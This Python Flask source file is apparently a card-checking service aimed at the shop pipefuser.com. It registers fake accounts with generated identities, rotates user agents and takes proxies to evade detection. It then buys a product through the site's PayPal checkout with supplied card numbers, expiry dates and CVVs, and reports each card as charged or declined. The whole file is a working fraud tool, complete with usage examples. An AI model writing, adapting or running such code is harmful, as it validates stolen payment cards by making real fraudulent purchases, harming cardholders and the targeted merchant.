# pipefuser_api.py
from flask import Flask, request, jsonify
import requests, re, random, time
from bs4 import BeautifulSoup
from faker import Faker
import traceback

app = Flask(__name__)

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        cc, mm, yy, cvv = card.split("|")
        mm = mm.zfill(2)
        yy = f"20{yy}" if len(yy) == 2 else yy
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        f = Faker()
        fn, ln = f.first_name(), f.last_name()
        return {
            "first": fn,
            "last": ln,
            "name": f"{fn} {ln}",
            "address": f.street_address(),
            "city": "New York",
            "state": "NY",
            "zip": random.choice(["10001", "10002", "10003", "10004", "10005"]),
            "email": f"{fn.lower()}.{ln.lower()}{random.randint(100,999)}@gmail.com",
            "phone": ''.join(random.choices('0123456789', k=10))
        }

class gateway:
    BASE = "https://pipefuser.com"
    SHIPPING = "uspsr_usps1"

    @staticmethod
    def code(card: str, prox: str = None) -> tuple:
        proxy_dict = {"http": prox, "https": prox} if prox else None
        ccd = tools.getcard(card)
        user = tools.userdata()
        price = "N/A"

        for attempt in range(3):
            try:
                with requests.Session() as s:
                    # Set timeout and headers
                    if proxy_dict:
                        s.proxies.update(proxy_dict)
                    
                    # Rotate user agents
                    user_agents = [
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ]
                    
                    s.headers.update({
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Cache-Control': 'max-age=0',
                    })

                    # Test connection first
                    try:
                        test_resp = s.get(f"{gateway.BASE}", timeout=30)
                        if test_resp.status_code != 200:
                            return 'ERROR', f"Site unreachable (Status: {test_resp.status_code})"
                    except requests.exceptions.Timeout:
                        return 'ERROR', 'Connection timeout - Site slow or down'
                    except requests.exceptions.ConnectionError:
                        return 'ERROR', 'Connection failed - Site may be blocking or down'
                    
                    # registration token
                    resp = s.get(f"{gateway.BASE}/index.php?main_page=create_account", timeout=30)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    token_input = soup.find('input', {'name': 'securityToken'})
                    if not token_input:
                        return 'ERROR', 'Failed to get security token'
                    token = token_input['value']

                    # create account
                    data = {
                        'securityToken': token, 'action': 'process', 'email_pref_html': 'email_format',
                        'company': '', 'firstname': user['first'], 'lastname': user['last'],
                        'zone_country_id': '223', 'street_address': user['address'],
                        'n7dpdkLyei': '', 'suburb': '', 'city': user['city'],
                        'zone_id': '43', 'state': '\xa0', 'postcode': user['zip'],
                        'telephone': user['phone'], 'email_address': user['email'],
                        'password': 'Aa123456@', 'confirmation': 'Aa123456@', 'email_format': 'HTML',
                        'x': '29', 'y': '16'
                    }
                    resp = s.post(f"{gateway.BASE}/index.php?main_page=create_account", data=data, timeout=30)
                    if "create_account_success" not in resp.url:
                        continue

                    # add to cart
                    resp = s.get(f"{gateway.BASE}/index.php?main_page=product_info&cPath=11&products_id=53", timeout=30)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    token = soup.find('input', {'name': 'securityToken'})['value']
                    files = {
                        'securityToken': (None, token), 'cart_quantity': (None, '1'),
                        'products_id': (None, '53'), 'x': (None, '67'), 'y': (None, '9')
                    }
                    s.post(f"{gateway.BASE}/index.php?main_page=product_info&cPath=11&products_id=53&action=add_product",
                           files=files, headers={'Referer': resp.url}, timeout=30)

                    # view cart
                    s.get(f"{gateway.BASE}/index.php?main_page=shopping_cart", timeout=30)

                    # shipping
                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_shipping", timeout=30)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    token = soup.find('input', {'name': 'securityToken'})['value']
                    data = {'securityToken': token, 'action': 'process', 'shipping': gateway.SHIPPING,
                            'comments': '', 'x': '123', 'y': '15'}
                    resp = s.post(f"{gateway.BASE}/index.php?main_page=checkout_shipping", data=data,
                                  headers={'Referer': f"{gateway.BASE}/index.php?main_page=checkout_shipping"}, timeout=30)

                    # ajax payment
                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_payment", timeout=30)
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    token = soup.find('input', {'name': 'securityToken'})['value']
                    ajax_data = {
                        'securityToken': token, 'action': 'submit', 'dc_redeem_code': '',
                        'payment': 'paypaldp', 'paypalwpp_cc_firstname': user['first'],
                        'paypalwpp_cc_lastname': user['last'], 'paypalwpp_cc_number': ccd['cc'],
                        'paypalwpp_cc_expires_month': ccd['mm'], 'paypalwpp_cc_expires_year': ccd['yy'],
                        'paypalwpp_cc_checkcode': ccd['cvv'], 'paypaldp_collects_onsite': 'true', 'comments': ''
                    }
                    ajax_resp = s.post(f"{gateway.BASE}/ajax.php?act=ajaxPayment&method=prepareConfirmation",
                                       data=ajax_data, headers={'X-Requested-With': 'XMLHttpRequest', 'Origin': gateway.BASE}, timeout=30)
                    try:
                        ajax_json = ajax_resp.json()
                        confirm_html = ajax_json.get('confirmationHtml', '')
                        psoup = BeautifulSoup(confirm_html, 'html.parser')
                        total_div = psoup.find('div', id='ottotal')
                        if total_div:
                            price_span = total_div.find(class_='totalBox')
                            if price_span:
                                price = price_span.get_text(strip=True)
                    except:
                        price = "N/A"

                    # process order
                    order_data = {
                        'securityToken': token, 'wpp_cc_type': '',
                        'wpp_cc_expdate_month': ccd['mm'], 'wpp_cc_expdate_year': ccd['yy'],
                        'wpp_cc_issuedate_month': '', 'wpp_cc_issuedate_year': '', 'wpp_cc_issuenumber': '',
                        'wpp_cc_number': ccd['cc'], 'wpp_cc_checkcode': ccd['cvv'],
                        'wpp_payer_firstname': user['first'], 'wpp_payer_lastname': user['last'],
                        'zenid': s.cookies.get('zenid')
                    }
                    resp = s.post(f"{gateway.BASE}/index.php?main_page=checkout_process", data=order_data,
                                  headers={'Referer': f"{gateway.BASE}/index.php?main_page=checkout_payment", 'Origin': gateway.BASE},
                                  allow_redirects=True, timeout=30)

                    # result
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    err = soup.find(class_='messageStackError')
                    if err:
                        return 'DECLINED', err.get_text(strip=True)

                    suc = soup.find(class_='messageStackSuccess')
                    if suc:
                        order_id = None
                        order_id_el = soup.find('span', id='orderNumber') or soup.find('span', class_='order-number')
                        if order_id_el:
                            order_id = order_id_el.get_text(strip=True)
                        else:
                            match = re.search(r'Order #?(\d+)', resp.text)
                            if match:
                                order_id = match.group(1)
                        if order_id:
                            return 'CHARGED', f"Order #{order_id} - {price}"
                        else:
                            return 'CHARGED', f"Charged - {price}"

                    if 'decline' in resp.text.lower():
                        return 'DECLINED', 'Transaction declined'
                    return 'UNKNOWN', 'Response unclear'
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except Exception as e:
                continue
        return 'ERROR', 'Connection failed after 3 retries'

@app.route('/Payflow', methods=['GET'])
def payflow_check():
    """
    API endpoint to check card on pipefuser.com
    Usage: /Payflow?cc=card_number|mm|yy|cvv&proxy=user:pass@ip:port (optional)
    Example: /Payflow?cc=4496130001514478|08|26|123
    """
    cc_param = request.args.get('cc')
    proxy_param = request.args.get('proxy', None)
    
    if not cc_param:
        return jsonify({
            "success": False,
            "error": "Missing cc parameter",
            "usage": "/Payflow?cc=card_number|mm|yy|cvv",
            "example": "/Payflow?cc=4496130001514478|08|26|123"
        }), 400
    
    # Parse card details
    parts = cc_param.split('|')
    if len(parts) < 4:
        return jsonify({
            "success": False,
            "error": "Invalid format. Expected: card_number|mm|yy|cvv",
            "received": cc_param
        }), 400
    
    card_number = parts[0].strip()
    month = parts[1].strip()
    year = parts[2].strip()
    cvv = parts[3].strip()
    
    # Basic validation
    if not card_number.isdigit() or len(card_number) < 13:
        return jsonify({
            "success": False,
            "error": "Invalid card number"
        }), 400
    
    if not month.isdigit() or int(month) < 1 or int(month) > 12:
        return jsonify({
            "success": False,
            "error": "Invalid month"
        }), 400
    
    if not year.isdigit() or len(year) not in [2, 4]:
        return jsonify({
            "success": False,
            "error": "Invalid year (use 2 or 4 digits)"
        }), 400
    
    if not cvv.isdigit() or len(cvv) < 3:
        return jsonify({
            "success": False,
            "error": "Invalid CVV"
        }), 400
    
    # Format full card string
    full_card = f"{card_number}|{month}|{year}|{cvv}"
    
    # Process the check
    start_time = time.time()
    status, message = gateway.code(full_card, proxy_param if proxy_param else None)
    elapsed_time = round(time.time() - start_time, 2)
    
    # Parse order info from message if available
    order_id = None
    price = None
    
    if "Order #" in message:
        order_match = re.search(r'Order #(\d+)', message)
        if order_match:
            order_id = order_match.group(1)
        price_match = re.search(r'\$?(\d+\.?\d*)', message)
        if price_match:
            price = price_match.group(1)
    
    # Compact response
    response = {
        "success": status == "CHARGED",
        "Card": card_number,
        "status": status,
        "message": message,
        "processing_time": f"{elapsed_time}s"
    }
    
    # Add order info if available
    if order_id:
        response["order_id"] = order_id
    if price:
        response["price"] = price
    
    return jsonify(response), 200

@app.route('/test', methods=['GET'])
def test_connection():
    """Test if pipefuser.com is reachable"""
    try:
        response = requests.get("https://pipefuser.com", timeout=10)
        return jsonify({
            "reachable": True,
            "status_code": response.status_code,
            "response_time": response.elapsed.total_seconds()
        })
    except Exception as e:
        return jsonify({
            "reachable": False,
            "error": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Pipefuser.com Payment Checker",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }), 200

@app.route('/', methods=['GET'])
def index():
    """API information"""
    return jsonify({
        "service": "Pipefuser.com Payment Checker API",
        "endpoints": {
            "/Payflow": "Check card (GET: ?cc=card|mm|yy|cvv&proxy=optional)",
            "/test": "Test if pipefuser.com is reachable",
            "/health": "Health check"
        },
        "example": "/Payflow?cc=4496130001514478|08|26|123",
        "proxy_format": "user:pass@ip:port (optional)",
        "price": "$19.57",
        "requests": "4 requests per card"
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
